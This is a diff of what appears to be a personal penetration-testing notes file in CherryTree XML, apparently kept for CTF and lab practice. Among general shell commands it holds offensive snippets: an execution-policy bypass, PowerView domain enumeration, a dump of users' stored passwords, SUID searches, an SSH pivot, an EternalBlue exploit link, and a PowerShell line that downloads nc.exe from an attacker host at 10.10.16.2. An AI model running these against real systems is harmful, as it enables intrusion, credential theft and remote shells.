@@ -56,7 +56,7 @@ tar -xf &lt;file_name&gt;</rich_text>
 unzip &lt;zip_file&gt;</rich_text>
     </node>
   </node>
-  <node name="QEMU/KVM+VIRTM" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1662477240" ts_lastsave="1662637190">
+  <node name="QEMU/KVM+VIRTM" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1662477240" ts_lastsave="1663434109">
     <rich_text>auto resize
 </rich_text>
     <rich_text family="monospace">xrandr --output Virtual-1 --auto</rich_text>
@@ -87,7 +87,16 @@ mount sharepoint
 sudo mount -t 9p -o trans=virtio /hostshare hostfiles/
 
 auto mount
+add the following to </rich_text>
+    <rich_text scale="h3"> </rich_text>
+    <rich_text family="monospace">/etc/fstab</rich_text>
+    <rich_text>
 /hostshare /hostfiles 9p trans=virtio,version=9p2000.L,rw 0 0</rich_text>
+  </node>
+  <node name="smbclient" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663434109" ts_lastsave="1663434130">
+    <rich_text>list smbclient
+smbclient -L &lt;IP&gt; -U &lt;user&gt; -P &lt;pass&gt;
+</rich_text>
   </node>
   <node name="database" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393786" ts_lastsave="1655393844">
     <node name="sqllite" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393789" ts_lastsave="1655393790">
@@ -309,158 +318,9 @@ Attacker:
       <rich_text family="monospace">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</rich_text>
     </node>
   </node>
-  <node name="os_commands" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394169" ts_lastsave="1655394196">
-    <node name="linux" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394178" ts_lastsave="1656864713">
-      <rich_text>knowing filetype
-file &lt;filename&gt;
-
-create new user
-sudo useradd &lt;username&gt;
-sudo passwd &lt;username&gt;
-
-delet new user
-userdel username
-
-switching user
-su &lt;username&gt;
-
-viewing process
-ps
-
-viewing process run by other user (in example by system)
-ps aux
-
-stop process
-kill &lt;process_pid&gt;
-
-starting sevice
-systemctl start &lt;service_name&gt;
-
-stopping sevice
-systemctl stop &lt;service_name&gt;
-
-find available shells
-</rich_text>
-      <rich_text family="monospace">cat /etc/shells</rich_text>
-      <rich_text>
-
-add new binary path
-export PATH="${HOME}/.local/bin:${PATH}"
-
-check running environment
-env
-
-history
-history</rich_text>
-      <node name="text_processing" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394284" ts_lastsave="1656694217">
-        <rich_text foreground="#d4d4d4">default
-cat &lt;file&gt; | grep &lt;search&gt;</rich_text>
-        <rich_text>
-
-</rich_text>
-        <rich_text foreground="#c586c0">case</rich_text>
-        <rich_text foreground="#d4d4d4"> insensitive
-cat &lt;file&gt; | grep -i &lt;search&gt;</rich_text>
-        <rich_text>
-
-</rich_text>
-        <rich_text foreground="#d4d4d4">does not contain
-cat &lt;file&gt; | grep -n &lt;search&gt;</rich_text>
-        <rich_text>
-
-</rich_text>
-        <rich_text foreground="#d4d4d4">sort result unique
-cat &lt;file&gt; | grep &lt;search&gt; | sort -u</rich_text>
-        <rich_text>
-
-</rich_text>
-        <rich_text foreground="#d4d4d4">count by new line
-cat &lt;file&gt; | wc -l</rich_text>
-        <rich_text>
-
-</rich_text>
-        <rich_text foreground="#d4d4d4">count by char
-cat &lt;file&gt; | wc -</rich_text>
-        <rich_text>c
-
-</rich_text>
-        <rich_text foreground="#d4d4d4">cutting table like string
-cat &lt;file&gt; | cut -d &lt;delimiter&gt; -f &lt;position starts from 1&gt;</rich_text>
-        <rich_text>
-
-editing text file using sed
-echo "I need to try hard" | sed 's/hard/harder/'
-
-cutting using awk
-echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
-
-</rich_text>
-        <rich_text link="webs https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux">https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux</rich_text>
-        <rich_text>
-</rich_text>
-        <rich_text family="monospace">grep -Rl "['AllowNoPassword']" /</rich_text>
-        <rich_text>
-
-grep -rnw '/' -e 'AllowNoPassword' 2 &gt; /dev/null
-
-grep -rwl "root" / 2&gt; /dev/null  | grep phpmyadmin</rich_text>
-      </node>
-      <node name="export" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656669294" ts_lastsave="1656669297">
-        <rich_text>The export command makes the variable accessible to any subprocesses we might spawn from our current Bash instance. If we set an environment variable without export it will only be available in the current shell.
-</rich_text>
-      </node>
-      <node name="utilities" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394355" ts_lastsave="1655394356">
-        <rich_text>finding files
-locate &lt;filename&gt;
-
-finding file other
-find -name &lt;filename_can_wildcard&gt;</rich_text>
-      </node>
-      <node name="finding_files" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656667532" ts_lastsave="1656668429">
-        <rich_text>using find
-
-sudo find / -name sbd
-^find by file name
-
-finding binary in PATH
-which
-
-finding files by database
-locate</rich_text>
-      </node>
-      <node name="apt" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656668183" ts_lastsave="1656668381">
-        <rich_text>update database
-apt update
-
-upgrade software
-apt upgrade
-apt upgrade &lt;specific_package&gt;
-
-search available package
-apt-cache search 
-
-show information about specific package
-apt show resource-agents
-
-install new package
-apt install
-
-remove package and it's configuration
-apt remove --purge
-
-dpkg / .deb installer
-dpkg -i &lt;package_file&gt;.deb</rich_text>
-      </node>
-      <node name="wget" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656864713" ts_lastsave="1656864755">
-        <rich_text>wget from index page recusively
-</rich_text>
-        <rich_text family="monospace">wget -r -np -R "index.html*" </rich_text>
-        <rich_text link="webs https://0a5000a903558665c06b54b600d7006b.web-security-academy.net/.git">https://0a5000a903558665c06b54b600d7006b.web-security-academy.net/.git</rich_text>
-      </node>
-    </node>
-    <node name="windows" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394181" ts_lastsave="1655649452">
-      <node name="cmd" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394591" ts_lastsave="1655817354">
-        <rich_text>get hostname / pc name
+  <node name="windows" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394181" ts_lastsave="1663517460">
+    <node name="cmd" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394591" ts_lastsave="1663521397">
+      <rich_text>get hostname / pc name
 hostname
 
 get username
@@ -495,30 +355,33 @@ control /name Microsoft.WindowsUpdate
 
 add user as admin
 </rich_text>
-        <rich_text family="monospace">net localgroup administrators &lt;username&gt; /add</rich_text>
-        <rich_text>
+      <rich_text family="monospace">net localgroup administrators &lt;username&gt; /add</rich_text>
+      <rich_text>
 
 add user
 </rich_text>
-        <rich_text family="monospace">net user &lt;username&gt; &lt;password&gt; /add</rich_text>
-        <rich_text>
-c</rich_text>
-      </node>
-      <node name="env_path" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394602" ts_lastsave="1655394612">
-        <rich_text>windows root directory
+      <rich_text family="monospace">net user &lt;username&gt; &lt;password&gt; /add</rich_text>
+      <rich_text>
+
+systeminfo
+
+dir "search term*" /s</rich_text>
+    </node>
+    <node name="env_path" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394602" ts_lastsave="1655394612">
+      <rich_text>windows root directory
 %windir%</rich_text>
-      </node>
-      <node name="GUI" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394612" ts_lastsave="1655394630">
-        <rich_text>make user:
+    </node>
+    <node name="GUI" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394612" ts_lastsave="1655394630">
+      <rich_text>make user:
 Start menu &gt;&gt; type "Other User" &gt;&gt; Add user
 
 system environment variable
 Control Panel &gt; System and Security &gt; System &gt; Advanced system settings &gt; Environment Variables 
 or 
 Settings &gt; System &gt; About &gt; system info &gt; Advanced system settings &gt; Environment Variable</rich_text>
-      </node>
-      <node name="run" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394630" ts_lastsave="1655394636">
-        <rich_text>user and group manager
+    </node>
+    <node name="run" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394630" ts_lastsave="1655394636">
+      <rich_text>user and group manager
 lusrmgr.msc
 
 microsoft configuration
@@ -544,28 +407,28 @@ regedit
 
 windows firewall
 WF.msc</rich_text>
-      </node>
-      <node name="powershell" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655649452" ts_lastsave="1655725264">
-        <rich_text>bypass execution policy
+    </node>
+    <node name="powershell" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655649452" ts_lastsave="1655725264">
+      <rich_text>bypass execution policy
 </rich_text>
-        <rich_text family="monospace">powershell -ep bypass</rich_text>
-        <rich_text>
+      <rich_text family="monospace">powershell -ep bypass</rich_text>
+      <rich_text>
 
 importing (?) powerview script
 </rich_text>
-        <rich_text family="monospace">. .\PowerView.ps1</rich_text>
-      </node>
-      <node name="powerview" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655649812" ts_lastsave="1655727658">
-        <rich_text link="webs https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</rich_text>
-        <rich_text>
+      <rich_text family="monospace">. .\PowerView.ps1</rich_text>
+    </node>
+    <node name="powerview" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655649812" ts_lastsave="1655727658">
+      <rich_text link="webs https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</rich_text>
+      <rich_text>
 
 get fulldata and selecting OS
 Get-NetComputer -fulldata | select operatingsystem
 
 get users and selecting domain name
 </rich_text>
-        <rich_text family="monospace">Get-NetUser | select cn</rich_text>
-        <rich_text>
+      <rich_text family="monospace">Get-NetUser | select cn</rich_text>
+      <rich_text>
 
 show all group
 Get-NetGroup
@@ -777,15 +640,169 @@ Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
 # check if any user passwords are set
 $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
 </rich_text>
-      </node>
-      <node name="metasploit" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655727658" ts_lastsave="1655727658"/>
+    </node>
+    <node name="metasploit" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655727658" ts_lastsave="1655727658"/>
+  </node>
+  <node name="smb_enum" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663517460" ts_lastsave="1663517460">
+    <rich_text link="webs https://steflan-security.com/hack-the-box-blue-walkthrough/">https://steflan-security.com/hack-the-box-blue-walkthrough/</rich_text>
+  </node>
+  <node name="linux" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394178" ts_lastsave="1663435601">
+    <rich_text>knowing filetype
+file &lt;filename&gt;
+
+create new user
+sudo useradd &lt;username&gt;
+sudo passwd &lt;username&gt;
+
+delet new user
+userdel username
+
+switching user
+su &lt;username&gt;
+
+viewing process
+ps
+
+viewing process run by other user (in example by system)
+ps aux
+
+stop process
+kill &lt;process_pid&gt;
+
+starting sevice
+systemctl start &lt;service_name&gt;
+
+stopping sevice
+systemctl stop &lt;service_name&gt;
+
+find available shells
+</rich_text>
+    <rich_text family="monospace">cat /etc/shells</rich_text>
+    <rich_text>
+
+add new binary path
+export PATH="${HOME}/.local/bin:${PATH}"
+
+check running environment
+env
+
+history
+history</rich_text>
+    <node name="text_processing" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394284" ts_lastsave="1656694217">
+      <rich_text foreground="#d4d4d4">default
+cat &lt;file&gt; | grep &lt;search&gt;</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text foreground="#c586c0">case</rich_text>
+      <rich_text foreground="#d4d4d4"> insensitive
+cat &lt;file&gt; | grep -i &lt;search&gt;</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text foreground="#d4d4d4">does not contain
+cat &lt;file&gt; | grep -n &lt;search&gt;</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text foreground="#d4d4d4">sort result unique
+cat &lt;file&gt; | grep &lt;search&gt; | sort -u</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text foreground="#d4d4d4">count by new line
+cat &lt;file&gt; | wc -l</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text foreground="#d4d4d4">count by char
+cat &lt;file&gt; | wc -</rich_text>
+      <rich_text>c
+
+</rich_text>
+      <rich_text foreground="#d4d4d4">cutting table like string
+cat &lt;file&gt; | cut -d &lt;delimiter&gt; -f &lt;position starts from 1&gt;</rich_text>
+      <rich_text>
+
+editing text file using sed
+echo "I need to try hard" | sed 's/hard/harder/'
+
+cutting using awk
+echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
+
+</rich_text>
+      <rich_text link="webs https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux">https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text family="monospace">grep -Rl "['AllowNoPassword']" /</rich_text>
+      <rich_text>
+
+grep -rnw '/' -e 'AllowNoPassword' 2 &gt; /dev/null
+
+grep -rwl "root" / 2&gt; /dev/null  | grep phpmyadmin</rich_text>
+    </node>
+    <node name="export" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656669294" ts_lastsave="1656669297">
+      <rich_text>The export command makes the variable accessible to any subprocesses we might spawn from our current Bash instance. If we set an environment variable without export it will only be available in the current shell.
+</rich_text>
+    </node>
+    <node name="utilities" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394355" ts_lastsave="1655394356">
+      <rich_text>finding files
+locate &lt;filename&gt;
+
+finding file other
+find -name &lt;filename_can_wildcard&gt;</rich_text>
+    </node>
+    <node name="finding_files" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656667532" ts_lastsave="1656668429">
+      <rich_text>using find
+
+sudo find / -name sbd
+^find by file name
+
+finding binary in PATH
+which
+
+finding files by database
+locate</rich_text>
+    </node>
+    <node name="apt" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656668183" ts_lastsave="1656668381">
+      <rich_text>update database
+apt update
+
+upgrade software
+apt upgrade
+apt upgrade &lt;specific_package&gt;
+
+search available package
+apt-cache search 
+
+show information about specific package
+apt show resource-agents
+
+install new package
+apt install
+
+remove package and it's configuration
+apt remove --purge
+
+dpkg / .deb installer
+dpkg -i &lt;package_file&gt;.deb</rich_text>
+    </node>
+    <node name="wget" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656864713" ts_lastsave="1656864755">
+      <rich_text>wget from index page recusively
+</rich_text>
+      <rich_text family="monospace">wget -r -np -R "index.html*" </rich_text>
+      <rich_text link="webs https://0a5000a903558665c06b54b600d7006b.web-security-academy.net/.git">https://0a5000a903558665c06b54b600d7006b.web-security-academy.net/.git</rich_text>
     </node>
   </node>
-  <node name="python_module" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394196" ts_lastsave="1658114839">
+  <node name="python_module" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394196" ts_lastsave="1663435801">
     <node name="SimpleHTTPServer" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394751" ts_lastsave="1655394754">
       <rich_text>python -m SimpleHTTPServer &lt;port&gt;
 python3 -m http.server &lt;port&gt;</rich_text>
     </node>
+  </node>
+  <node name="windows_hacks" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663435801" ts_lastsave="1663435815">
+    <rich_text link="webs https://github.com/helviojunior/MS17-010">https://github.com/helviojunior/MS17-010</rich_text>
+    <rich_text> eternal_blue</rich_text>
   </node>
   <node name="NodeJS" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1658117659" ts_lastsave="1658117662">
     <rich_text>Node Install Package : 
@@ -1056,7 +1073,7 @@ nmap --script-updatedb</rich_text>
       </node>
     </node>
   </node>
-  <node name="post_exploit_shell" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655814635" ts_lastsave="1656818398">
+  <node name="post_exploit_shell" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655814635" ts_lastsave="1663520409">
     <rich_text link="webs https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</rich_text>
     <rich_text>
 </rich_text>
@@ -1127,7 +1144,7 @@ and
 </rich_text>
       <rich_text family="monospace">stty cols &lt;number&gt;</rich_text>
     </node>
-    <node name="privesc" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655817747" ts_lastsave="1655990861">
+    <node name="privesc" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655817747" ts_lastsave="1663514056">
       <rich_text>find SUID
 
 find / -perm -u=s -type f 2&gt;/dev/null
@@ -1830,8 +1847,14 @@ exit</rich_text>
         </rich_text>
       </node>
     </node>
+    <node name="smb_enum" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663514056" ts_lastsave="1663514057">
+      <rich_text link="webs https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/</rich_text>
+    </node>
     <node name="pivoting" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656313484" ts_lastsave="1656313486">
       <rich_text>sudo ssh -N -L 0.0.0.0:80:192.168.1.105:80 wtf@10.1.2.114 </rich_text>
+    </node>
+    <node name="windows_ps_via_cmd" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663520409" ts_lastsave="1663521697">
+      <rich_text>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2/nc.exe', 'c:\Users\Public\Downloads\nc.exe')"</rich_text>
     </node>
   </node>
   <node name="obfuscate_deobfuscate" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656818398" ts_lastsave="1656836768">
